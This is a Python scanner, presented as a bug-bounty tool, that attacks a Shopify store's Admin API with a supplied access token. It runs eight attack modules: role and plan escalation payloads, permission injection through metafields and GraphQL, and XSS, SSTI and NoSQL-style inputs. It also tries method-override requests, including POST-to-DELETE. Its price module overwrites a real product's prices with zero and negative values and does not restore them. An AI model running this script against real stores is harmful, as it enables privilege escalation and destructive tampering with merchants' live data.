#!/usr/bin/env python3
"""
Shopify Mass Assignment / Parameter Pollution Scanner
Tests Shopify Admin API REST endpoints for mass assignment and parameter pollution vulnerabilities.
"""

import argparse
import json
import logging
import sys
import time
from datetime import datetime
from typing import Any, Dict, List, Optional, Tuple

try:
    import requests
except ImportError:
    print("Error: 'requests' library not found. Install with: pip install requests")
    sys.exit(1)

# ── Colors ──────────────────────────────────────────────────────────────────

class C:
    RESET   = "\033[0m"
    RED     = "\033[91m"
    GREEN   = "\033[92m"
    YELLOW  = "\033[93m"
    BLUE    = "\033[94m"
    MAGENTA = "\033[95m"
    CYAN    = "\033[96m"
    BOLD    = "\033[1m"
    DIM     = "\033[2m"


BANNER = f"""{C.CYAN}{C.BOLD}
 ╔═══════════════════════════════════════════════════════════════╗
 ║       Shopify Mass Assignment / Parameter Pollution Scanner   ║
 ║                    v1.0  |  Bug Bounty Toolkit                ║
 ╚═══════════════════════════════════════════════════════════════╝{C.RESET}
"""

# ── Logging ─────────────────────────────────────────────────────────────────

LOG_PATH = "/tmp/shopify_mass_assignment.log"

logger = logging.getLogger("shopify_mass_assignment")
logger.setLevel(logging.DEBUG)
fh = logging.FileHandler(LOG_PATH)
fh.setLevel(logging.DEBUG)
fh.setFormatter(logging.Formatter("%(asctime)s [%(levelname)s] %(message)s"))
logger.addHandler(fh)

# ── Helpers ─────────────────────────────────────────────────────────────────

def api_url(store: str, path: str) -> str:
    store = store.replace("https://", "").replace("http://", "").rstrip("/")
    return f"https://{store}{path}"


def headers(token: str, content_type: str = "application/json") -> Dict[str, str]:
    h = {
        "X-Shopify-Access-Token": token,
        "Content-Type": content_type,
        "Accept": "application/json",
    }
    return h


def print_result(attack: str, test: str, status: str, detail: str = "", severity: str = "") -> None:
    color_map = {"VULN": C.RED, "INFO": C.BLUE, "OK": C.GREEN, "WARN": C.YELLOW, "ERROR": C.RED}
    c = color_map.get(status, C.RESET)
    sev = f" [{severity}]" if severity else ""
    print(f"  {C.DIM}[{status}]{C.RESET}{sev} {C.BOLD}{attack}{C.RESET} → {test}")
    if detail:
        print(f"        {C.DIM}{detail}{C.RESET}")


def save_result(results: list, attack: str, test: str, status: str, detail: str, response_data: Any = None, severity: str = "") -> None:
    results.append({
        "attack": attack,
        "test": test,
        "status": status,
        "severity": severity,
        "detail": detail,
        "response_snippet": str(response_data)[:500] if response_data else None,
        "timestamp": datetime.utcnow().isoformat(),
    })


def safe_request(method: str, url: str, delay: float, verbose: bool, **kwargs) -> Optional[requests.Response]:
    """Make HTTP request with error handling and rate limiting."""
    try:
        if verbose:
            logger.debug(f"{method} {url} | kwargs={json.dumps({k: str(v)[:200] for k, v in kwargs.items()})}")
        resp = requests.request(method, url, timeout=30, **kwargs)
        time.sleep(delay)
        return resp
    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {method} {url} — {e}")
        time.sleep(delay)
        return None


def get_existing_product_id(store: str, token: str, delay: float) -> Optional[int]:
    """Fetch first available product ID for testing."""
    url = api_url(store, "/admin/api/2024-04/products.json?limit=1")
    resp = safe_request("GET", url, delay, False, headers=headers(token))
    if resp and resp.status_code == 200:
        products = resp.json().get("products", [])
        if products:
            return products[0]["id"]
    return None


def get_existing_customer_id(store: str, token: str, delay: float) -> Optional[int]:
    url = api_url(store, "/admin/api/2024-04/customers.json?limit=1")
    resp = safe_request("GET", url, delay, False, headers=headers(token))
    if resp and resp.status_code == 200:
        customers = resp.json().get("customers", [])
        if customers:
            return customers[0]["id"]
    return None


def get_existing_order_id(store: str, token: str, delay: float) -> Optional[int]:
    url = api_url(store, "/admin/api/2024-04/orders.json?limit=1&status=any")
    resp = safe_request("GET", url, delay, False, headers=headers(token))
    if resp and resp.status_code == 200:
        orders = resp.json().get("orders", [])
        if orders:
            return orders[0]["id"]
    return None


# ── Attack Modules ──────────────────────────────────────────────────────────

def attack_role_injection(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test if PUT to /shop.json accepts extra privilege fields."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 1: Role Injection via Shop Update{C.RESET}")

    extra_fields = {
        "shop": {
            "role": "owner",
            "plan_name": "shopify_plus",
            "permissions": "write_all",
            "staff_count": 999,
            "is_owner": True,
            "superuser": True,
            "admin": True,
        }
    }

    url = api_url(store, "/admin/api/2024-04/shop.json")
    resp = safe_request("PUT", url, delay, verbose,
                        headers=headers(token), json=extra_fields)

    if resp is None:
        print_result("Role Injection", "PUT /shop.json", "ERROR", "Request failed")
        save_result(results, "role_injection", "put_shop", "ERROR", "Request failed")
        return

    if resp.status_code in (200, 201):
        body = resp.json().get("shop", {})
        injected = []
        for field in ("role", "plan_name", "permissions", "staff_count", "is_owner", "superuser", "admin"):
            if field in body:
                injected.append(f"{field}={body[field]}")

        if injected:
            detail = f"Response returned injected fields: {', '.join(injected)}"
            print_result("Role Injection", "PUT /shop.json", "VULN", detail, "HIGH")
            save_result(results, "role_injection", "put_shop", "VULN", detail, body, "HIGH")
        else:
            print_result("Role Injection", "PUT /shop.json", "OK", f"Status {resp.status_code}, no injected fields reflected")
            save_result(results, "role_injection", "put_shop", "OK", f"Status {resp.status_code}, no injected fields reflected")
    elif resp.status_code == 403:
        print_result("Role Injection", "PUT /shop.json", "OK", "403 Forbidden — token lacks shop write scope")
        save_result(results, "role_injection", "put_shop", "OK", "403 Forbidden")
    elif resp.status_code == 422:
        body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else resp.text
        # 422 might still indicate the fields were *parsed* even if rejected
        detail = f"422 Unprocessable — {str(body)[:200]}"
        print_result("Role Injection", "PUT /shop.json", "INFO", detail)
        save_result(results, "role_injection", "put_shop", "INFO", detail, body)
    else:
        detail = f"HTTP {resp.status_code}"
        print_result("Role Injection", "PUT /shop.json", "INFO", detail)
        save_result(results, "role_injection", "put_shop", "INFO", detail)


def attack_plan_escalation(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test if changing plan_name via PUT actually changes the plan."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 2: Plan Escalation{C.RESET}")

    # First, read current shop state
    url = api_url(store, "/admin/api/2024-04/shop.json")
    resp = safe_request("GET", url, delay, verbose, headers=headers(token))
    original_plan = None
    if resp and resp.status_code == 200:
        original_plan = resp.json().get("shop", {}).get("plan_name", "unknown")
        print_result("Plan Escalation", "Read current plan", "INFO", f"Current plan: {original_plan}")

    # Try to escalate
    escalation_payloads = [
        {"shop": {"plan_name": "shopify_plus"}},
        {"shop": {"plan_name": "plus"}},
        {"shop": {"plan_name": "enterprise"}},
        {"shop": {"plan": "shopify_plus"}},
        {"shop": {"plan_name": "unlimited"}},
    ]

    for payload in escalation_payloads:
        plan_val = payload["shop"].get("plan_name") or payload["shop"].get("plan")
        resp = safe_request("PUT", url, delay, verbose,
                            headers=headers(token), json=payload)

        if resp is None:
            continue

        if resp.status_code in (200, 201):
            body = resp.json().get("shop", {})
            new_plan = body.get("plan_name", "")
            if new_plan != original_plan and new_plan in ("shopify_plus", "plus", "enterprise", "unlimited"):
                detail = f"Plan changed from '{original_plan}' to '{new_plan}'!"
                print_result("Plan Escalation", f"plan_name={plan_val}", "VULN", detail, "CRITICAL")
                save_result(results, "plan_escalation", f"plan={plan_val}", "VULN", detail, body, "CRITICAL")
            else:
                detail = f"Response plan_name='{new_plan}' (original was '{original_plan}')"
                print_result("Plan Escalation", f"plan_name={plan_val}", "OK", detail)
                save_result(results, "plan_escalation", f"plan={plan_val}", "OK", detail)
        else:
            print_result("Plan Escalation", f"plan_name={plan_val}", "INFO", f"HTTP {resp.status_code}")
            save_result(results, "plan_escalation", f"plan={plan_val}", "INFO", f"HTTP {resp.status_code}")


def attack_permission_injection(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test if a write_products token can inject write_customers/write_orders via metafields or shop update."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 3: Permission Injection{C.RESET}")

    # Try injecting via metafields on shop
    permission_payloads = [
        {"metafield": {"namespace": "permissions", "key": "write_customers", "value": "true", "type": "boolean"}},
        {"metafield": {"namespace": "access", "key": "scopes", "value": "write_customers,write_orders,write_all", "type": "string"}},
        {"metafield": {"namespace": "app", "key": "permissions", "value": json.dumps({"write_customers": True, "write_orders": True}), "type": "json_string"}},
    ]

    url = api_url(store, "/admin/api/2024-04/metafields.json")
    for payload in permission_payloads:
        ns = payload["metafield"]["namespace"]
        key = payload["metafield"]["key"]
        resp = safe_request("POST", url, delay, verbose,
                            headers=headers(token), json=payload)
        if resp is None:
            continue

        if resp.status_code in (200, 201):
            body = resp.json()
            detail = f"Metafield created: {ns}/{key} — {str(body)[:200]}"
            print_result("Permission Injection", f"metafield {ns}/{key}", "WARN", detail, "MEDIUM")
            save_result(results, "permission_injection", f"metafield_{ns}_{key}", "WARN", detail, body, "MEDIUM")
        else:
            print_result("Permission Injection", f"metafield {ns}/{key}", "INFO", f"HTTP {resp.status_code}")
            save_result(results, "permission_injection", f"metafield_{ns}_{key}", "INFO", f"HTTP {resp.status_code}")

    # Try via GraphQL introspection + mutation
    gql_url = api_url(store, "/admin/api/2024-04/graphql.json")
    mutation = {
        "query": """
        mutation shopUpdate($input: ShopInput!) {
            shopUpdate(input: $input) {
                shop { name plan { displayName } }
                userErrors { field message }
            }
        }
        """,
        "variables": {
            "input": {
                "metafields": [
                    {"namespace": "permissions", "key": "write_customers", "value": "true", "type": "boolean"},
                    {"namespace": "permissions", "key": "role", "value": "owner", "type": "string"},
                ]
            }
        }
    }

    resp = safe_request("POST", gql_url, delay, verbose,
                        headers=headers(token), json=mutation)
    if resp:
        body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
        if resp.status_code == 200 and not body.get("errors"):
            data = body.get("data", {}).get("shopUpdate", {})
            errors = data.get("userErrors", [])
            if not errors:
                print_result("Permission Injection", "GraphQL shopUpdate", "WARN", "Mutation accepted without errors", "MEDIUM")
                save_result(results, "permission_injection", "graphql_shop_update", "WARN", "Mutation accepted without errors", body, "MEDIUM")
            else:
                print_result("Permission Injection", "GraphQL shopUpdate", "OK", f"Blocked: {str(errors)[:200]}")
                save_result(results, "permission_injection", "graphql_shop_update", "OK", f"Blocked: {errors}")
        else:
            errs = body.get("errors", [])
            detail = f"GraphQL errors: {str(errs)[:200]}" if errs else f"HTTP {resp.status_code}"
            print_result("Permission Injection", "GraphQL shopUpdate", "INFO", detail)
            save_result(results, "permission_injection", "graphql_shop_update", "INFO", detail)


def attack_price_manipulation(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test if product price can be manipulated via bulk/unexpected endpoints."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 4: Price Manipulation{C.RESET}")

    product_id = get_existing_product_id(store, token, delay)
    if not product_id:
        print_result("Price Manipulation", "Lookup product", "WARN", "No products found to test against")
        save_result(results, "price_manipulation", "lookup", "WARN", "No products found")
        return

    print_result("Price Manipulation", "Target product", "INFO", f"Using product ID: {product_id}")

    # Test standard price update with negative / zero / extreme values
    price_payloads = [
        {"product": {"variants": [{"price": "0.00"}]}},           # Free
        {"product": {"variants": [{"price": "-100.00"}]}},         # Negative
        {"product": {"variants": [{"price": "0.01"}]}},            # Penny
        {"product": {"variants": [{"price": "999999.99"}]}},       # Extreme high
        {"product": {"price": "0.00"}},                            # Top-level price field
        {"product": {"variants": [{"price": "0", "compare_at_price": "999999.99"}]}},  # Fake discount
    ]

    url = api_url(store, f"/admin/api/2024-04/products/{product_id}.json")
    for payload in price_payloads:
        price_val = "?"
        try:
            if "variants" in payload.get("product", {}):
                price_val = payload["product"]["variants"][0].get("price", "?")
            else:
                price_val = payload["product"].get("price", "?")
        except Exception:
            pass

        resp = safe_request("PUT", url, delay, verbose,
                            headers=headers(token), json=payload)
        if resp is None:
            continue

        if resp.status_code in (200, 201):
            body = resp.json()
            variants = body.get("product", {}).get("variants", [])
            actual_prices = [v.get("price") for v in variants]
            detail = f"Price set to {price_val}, response prices: {actual_prices}"
            if any(p in ("0.00", "-100.00", "0.01") for p in actual_prices):
                print_result("Price Manipulation", f"price={price_val}", "VULN", detail, "HIGH")
                save_result(results, "price_manipulation", f"price_{price_val}", "VULN", detail, body, "HIGH")
            else:
                print_result("Price Manipulation", f"price={price_val}", "INFO", detail)
                save_result(results, "price_manipulation", f"price_{price_val}", "INFO", detail)
        elif resp.status_code == 422:
            print_result("Price Manipulation", f"price={price_val}", "OK", f"422 rejected — validation working")
            save_result(results, "price_manipulation", f"price_{price_val}", "OK", "422 rejected")
        else:
            print_result("Price Manipulation", f"price={price_val}", "INFO", f"HTTP {resp.status_code}")
            save_result(results, "price_manipulation", f"price_{price_val}", "INFO", f"HTTP {resp.status_code}")

    # Test bulk operations endpoint
    bulk_url = api_url(store, "/admin/api/2024-04/products.json")
    bulk_payload = {
        "product": {
            "title": "Mass Assignment Test Product",
            "variants": [{"price": "0.00", "requires_shipping": False}],
            "published": True,
            "vendor": "mass-assignment-test",
            "tags": "mass-assignment, test",
            "admin_graphql_api_id": "gid://shopify/Product/1",
        }
    }
    resp = safe_request("POST", bulk_url, delay, verbose,
                        headers=headers(token), json=bulk_payload)
    if resp:
        if resp.status_code in (200, 201):
            body = resp.json()
            pid = body.get("product", {}).get("id")
            print_result("Price Manipulation", "Create $0 product", "VULN", f"Created product ID {pid} at $0.00", "HIGH")
            save_result(results, "price_manipulation", "create_free_product", "VULN", f"Created product {pid}", body, "HIGH")
            # Clean up: delete test product
            if pid:
                del_url = api_url(store, f"/admin/api/2024-04/products/{pid}.json")
                safe_request("DELETE", del_url, delay, verbose, headers=headers(token))
                logger.info(f"Cleaned up test product {pid}")
        else:
            print_result("Price Manipulation", "Create $0 product", "OK", f"HTTP {resp.status_code}")
            save_result(results, "price_manipulation", "create_free_product", "OK", f"HTTP {resp.status_code}")


def attack_hidden_parameters(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Fuzz common API endpoints with hidden privilege parameters."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 5: Hidden Parameter Discovery{C.RESET}")

    hidden_params = [
        "admin", "role", "superuser", "is_owner", "plan", "permissions",
        "staff_count", "account_type", "is_admin", "access_level",
        "verified", "confirmed", "active", "approved", "premium",
        "pro", "enterprise", "tier", "level", "flags", "features",
    ]

    endpoints = [
        ("PUT", "/admin/api/2024-04/shop.json", "shop"),
    ]

    product_id = get_existing_product_id(store, token, delay)
    if product_id:
        endpoints.append(("PUT", f"/admin/api/2024-04/products/{product_id}.json", "product"))

    for method, path, root_key in endpoints:
        url = api_url(store, path)
        for param in hidden_params:
            payload = {root_key: {param: "true"}}
            resp = safe_request(method, url, delay, verbose,
                                headers=headers(token), json=payload)
            if resp is None:
                continue

            if resp.status_code in (200, 201):
                body = resp.json().get(root_key, {})
                if param in body:
                    val = body[param]
                    if str(val).lower() in ("true", "1", "yes", "owner", "admin", "superuser"):
                        detail = f"Reflected with value: {val}"
                        print_result("Hidden Param", f"{path} → {param}", "VULN", detail, "MEDIUM")
                        save_result(results, "hidden_param", f"{path}_{param}", "VULN", detail, body, "MEDIUM")
                    else:
                        if verbose:
                            print_result("Hidden Param", f"{path} → {param}", "INFO", f"Reflected: {val}")
                        save_result(results, "hidden_param", f"{path}_{param}", "INFO", f"Reflected: {val}")
                # else: param silently ignored — normal
            elif resp.status_code == 422:
                body_text = resp.text[:150] if verbose else ""
                if verbose:
                    print_result("Hidden Param", f"{path} → {param}", "INFO", f"422 — {body_text}")
                save_result(results, "hidden_param", f"{path}_{param}", "INFO", f"422: {body_text}")


def attack_content_type_bypass(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test with different Content-Type headers to bypass validation."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 6: Content-Type Bypass{C.RESET}")

    content_types = [
        ("application/json", json.dumps({"shop": {"plan_name": "shopify_plus", "role": "owner"}}), "json"),
        ("application/x-www-form-urlencoded", "shop[plan_name]=shopify_plus&shop[role]=owner", "form-urlencoded"),
        ("multipart/form-data", None, "multipart"),  # Will use files param
        ("text/xml", "<shop><plan_name>shopify_plus</plan_name><role>owner</role></shop>", "xml"),
        ("application/xml", "<shop><plan_name>shopify_plus</plan_name><role>owner</role></shop>", "xml"),
    ]

    url = api_url(store, "/admin/api/2024-04/shop.json")

    for ct, body, label in content_types:
        kwargs: Dict[str, Any] = {"headers": headers(token, ct)}

        if label == "multipart":
            kwargs["files"] = {"shop[plan_name]": (None, "shopify_plus"), "shop[role]": (None, "owner")}
            kwargs.pop("headers", None)
            kwargs["headers"] = {"X-Shopify-Access-Token": token, "Accept": "application/json"}
        elif label == "json":
            kwargs["data"] = body
        elif label in ("xml",):
            kwargs["data"] = body
        else:
            kwargs["data"] = body

        resp = safe_request("PUT", url, delay, verbose, **kwargs)
        if resp is None:
            continue

        if resp.status_code in (200, 201):
            resp_body = {}
            try:
                resp_body = resp.json()
            except Exception:
                pass
            shop = resp_body.get("shop", {})
            interesting = {k: shop[k] for k in ("plan_name", "role", "permissions") if k in shop}
            if interesting:
                detail = f"{label}: HTTP {resp.status_code} — reflected fields: {interesting}"
                print_result("Content-Type Bypass", ct, "VULN", detail, "HIGH")
                save_result(results, "content_type_bypass", ct, "VULN", detail, resp_body, "HIGH")
            else:
                print_result("Content-Type Bypass", ct, "INFO", f"{label}: HTTP {resp.status_code}, no injected fields")
                save_result(results, "content_type_bypass", ct, "INFO", f"{label}: HTTP {resp.status_code}")
        else:
            print_result("Content-Type Bypass", ct, "INFO", f"{label}: HTTP {resp.status_code}")
            save_result(results, "content_type_bypass", ct, "INFO", f"{label}: HTTP {resp.status_code}")


def attack_http_method_override(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test X-HTTP-Method-Override header to bypass method restrictions."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 7: HTTP Method Override{C.RESET}")

    override_headers_list = [
        "X-HTTP-Method-Override",
        "X-HTTP-Method",
        "X-Method-Override",
    ]

    endpoints = [
        "/admin/api/2024-04/shop.json",
    ]

    product_id = get_existing_product_id(store, token, delay)
    if product_id:
        endpoints.append(f"/admin/api/2024-04/products/{product_id}.json")

    for path in endpoints:
        url = api_url(store, path)
        for override_header in override_headers_list:
            # Try POST with method override to PUT
            h = headers(token)
            h[override_header] = "PUT"
            payload = {"shop": {"plan_name": "shopify_plus"}}

            resp = safe_request("POST", url, delay, verbose,
                                headers=h, json=payload)
            if resp is None:
                continue

            if resp.status_code in (200, 201):
                body = resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {}
                shop = body.get("shop", {})
                if "plan_name" in shop:
                    detail = f"{override_header}: POST→PUT worked! plan_name={shop['plan_name']}"
                    print_result("Method Override", f"{override_header} on {path}", "VULN", detail, "MEDIUM")
                    save_result(results, "method_override", f"{override_header}_{path}", "VULN", detail, body, "MEDIUM")
                else:
                    print_result("Method Override", f"{override_header} on {path}", "INFO", f"HTTP {resp.status_code}, no plan_name in response")
                    save_result(results, "method_override", f"{override_header}_{path}", "INFO", f"HTTP {resp.status_code}")
            else:
                if verbose:
                    print_result("Method Override", f"{override_header} on {path}", "INFO", f"HTTP {resp.status_code}")
                save_result(results, "method_override", f"{override_header}_{path}", "INFO", f"HTTP {resp.status_code}")

            # Also try DELETE override
            h2 = headers(token)
            h2[override_header] = "DELETE"
            resp = safe_request("POST", url, delay, verbose,
                                headers=h2, json={})
            if resp and resp.status_code in (200, 204):
                print_result("Method Override", f"{override_header} DELETE on {path}", "WARN", f"POST→DELETE accepted! HTTP {resp.status_code}", "HIGH")
                save_result(results, "method_override", f"{override_header}_delete_{path}", "WARN", f"POST→DELETE accepted: {resp.status_code}", severity="HIGH")


def attack_json_parameter_injection(store: str, token: str, delay: float, verbose: bool, results: list) -> None:
    """Test nested JSON objects where simple values are expected."""
    print(f"\n{C.YELLOW}{C.BOLD}[*] Attack 8: JSON Parameter Injection{C.RESET}")

    product_id = get_existing_product_id(store, token, delay)
    if not product_id:
        print_result("JSON Injection", "Lookup product", "WARN", "No products found")
        save_result(results, "json_injection", "lookup", "WARN", "No products found")
        return

    url = api_url(store, f"/admin/api/2024-04/products/{product_id}.json")

    nested_payloads = [
        {"product": {"title": {"$gt": ""}, "body_html": "test"}},            # NoSQL-style injection
        {"product": {"title": "test", "vendor": {"$ne": None}}},              # NoSQL operator
        {"product": {"title": "test", "id": [1, 2, 3]}},                      # Array where scalar expected
        {"product": {"title": "test", "published_at": "1970-01-01T00:00:00Z"}},  # Edge-case date
        {"product": {"title": "test", "variants": [{"price": {"$gt": "0"}}]}},  # Nested NoSQL
        {"product": {"title": "test", "tags": ["<script>alert(1)</script>"]}},   # XSS in tags
        {"product": {"title": "test\ninjected", "body_html": "{{7*7}}"}},       # SSTI probe
        {"product": {"title": "test", "admin_graphql_api_id": "gid://shopify/Product/1"}},  # ID override
    ]

    for i, payload in enumerate(nested_payloads):
        label = list(payload["product"].keys())[-1]
        resp = safe_request("PUT", url, delay, verbose,
                            headers=headers(token), json=payload)
        if resp is None:
            continue

        if resp.status_code in (200, 201):
            body = resp.json().get("product", {})
            # Check if injected values were processed
            title = body.get("title", "")
            tags = body.get("tags", "")

            vuln_indicators = []
            if "<script>" in str(tags):
                vuln_indicators.append("XSS in tags reflected")
            if "{{49}}" in str(body.get("body_html", "")):
                vuln_indicators.append("SSTI template rendered")
            if str(body.get("admin_graphql_api_id", "")) == "gid://shopify/Product/1":
                vuln_indicators.append("admin_graphql_api_id overridden")

            if vuln_indicators:
                detail = "; ".join(vuln_indicators)
                print_result("JSON Injection", f"payload_{i} ({label})", "VULN", detail, "MEDIUM")
                save_result(results, "json_injection", f"payload_{i}", "VULN", detail, body, "MEDIUM")
            else:
                if verbose:
                    print_result("JSON Injection", f"payload_{i} ({label})", "OK", f"HTTP {resp.status_code}, no indicators")
                save_result(results, "json_injection", f"payload_{i}", "OK", f"HTTP {resp.status_code}, no indicators")
        elif resp.status_code == 422:
            if verbose:
                print_result("JSON Injection", f"payload_{i} ({label})", "OK", "422 rejected — validation working")
            save_result(results, "json_injection", f"payload_{i}", "OK", "422 rejected")
        else:
            if verbose:
                print_result("JSON Injection", f"payload_{i} ({label})", "INFO", f"HTTP {resp.status_code}")
            save_result(results, "json_injection", f"payload_{i}", "INFO", f"HTTP {resp.status_code}")


# ── Main ────────────────────────────────────────────────────────────────────

ATTACK_MAP = {
    "role_injection":        attack_role_injection,
    "plan_escalation":       attack_plan_escalation,
    "permission_injection":  attack_permission_injection,
    "price_manipulation":    attack_price_manipulation,
    "hidden_parameters":     attack_hidden_parameters,
    "content_type_bypass":   attack_content_type_bypass,
    "http_method_override":  attack_http_method_override,
    "json_injection":        attack_json_parameter_injection,
}


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Shopify Mass Assignment / Parameter Pollution Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--store", required=True, help="Shopify store domain (e.g. mystore.myshopify.com)")
    parser.add_argument("--token", required=True, help="Shopify Admin API access token")
    parser.add_argument("--attack", default="all", choices=list(ATTACK_MAP.keys()) + ["all"],
                        help="Specific attack to run (default: all)")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between requests in seconds (default: 0.5)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose output")
    args = parser.parse_args()

    print(BANNER)
    print(f"  {C.BOLD}Target:{C.RESET}  {args.store}")
    print(f"  {C.BOLD}Token:{C.RESET}   {args.token[:12]}...{args.token[-4:]}")
    print(f"  {C.BOLD}Attack:{C.RESET}  {args.attack}")
    print(f"  {C.BOLD}Delay:{C.RESET}   {args.delay}s")
    print(f"  {C.BOLD}Log:{C.RESET}     {LOG_PATH}")
    print(f"  {C.BOLD}Time:{C.RESET}    {datetime.utcnow().isoformat()}Z")
    print(f"  {'─' * 60}")

    logger.info(f"=== Scan started: store={args.store}, attack={args.attack} ===")

    results: List[Dict[str, Any]] = []

    if args.attack == "all":
        attacks = list(ATTACK_MAP.values())
    else:
        attacks = [ATTACK_MAP[args.attack]]

    for attack_fn in attacks:
        try:
            attack_fn(args.store, args.token, args.delay, args.verbose, results)
        except Exception as e:
            logger.exception(f"Exception in {attack_fn.__name__}: {e}")
            print_result(attack_fn.__name__, "execution", "ERROR", str(e))
            save_result(results, attack_fn.__name__, "execution", "ERROR", str(e))

    # ── Summary ─────────────────────────────────────────────────────────
    print(f"\n{'═' * 60}")
    print(f"{C.BOLD}  SCAN SUMMARY{C.RESET}")
    print(f"{'═' * 60}")

    vulns = [r for r in results if r["status"] == "VULN"]
    warns = [r for r in results if r["status"] == "WARN"]
    infos = [r for r in results if r["status"] == "INFO"]
    oks   = [r for r in results if r["status"] == "OK"]
    errs  = [r for r in results if r["status"] == "ERROR"]

    print(f"  {C.RED}VULN{C.RESET}   : {len(vulns)}")
    print(f"  {C.YELLOW}WARN{C.RESET}   : {len(warns)}")
    print(f"  {C.BLUE}INFO{C.RESET}   : {len(infos)}")
    print(f"  {C.GREEN}OK{C.RESET}     : {len(oks)}")
    print(f"  {C.RED}ERROR{C.RESET}  : {len(errs)}")
    print(f"  {C.BOLD}TOTAL{C.RESET}  : {len(results)}")
    print(f"{'─' * 60}")

    if vulns:
        print(f"\n  {C.RED}{C.BOLD}⚠ FINDINGS:{C.RESET}")
        for v in vulns:
            sev = f" [{v['severity']}]" if v.get("severity") else ""
            print(f"    {C.RED}•{C.RESET}{sev} {v['attack']} → {v['test']}")
            print(f"      {C.DIM}{v['detail']}{C.RESET}")

    if warns:
        print(f"\n  {C.YELLOW}{C.BOLD}⚠ WARNINGS:{C.RESET}")
        for w in warns:
            sev = f" [{w['severity']}]" if w.get("severity") else ""
            print(f"    {C.YELLOW}•{C.RESET}{sev} {w['attack']} → {w['test']}")
            print(f"      {C.DIM}{w['detail']}{C.RESET}")

    # Write JSON to stdout
    output = {
        "tool": "shopify_mass_assignment_scanner",
        "version": "1.0",
        "store": args.store,
        "scan_time": datetime.utcnow().isoformat() + "Z",
        "attack": args.attack,
        "summary": {
            "vulnerabilities": len(vulns),
            "warnings": len(warns),
            "info": len(infos),
            "ok": len(oks),
            "errors": len(errs),
            "total": len(results),
        },
        "results": results,
    }

    print(f"\n{C.DIM}{'─' * 60}")
    print("JSON Output:")
    print(f"{'─' * 60}{C.RESET}")
    print(json.dumps(output, indent=2))

    logger.info(f"=== Scan complete: {len(vulns)} vulns, {len(warns)} warns, {len(results)} total ===")

    sys.exit(1 if vulns else 0)


if __name__ == "__main__":
    main()
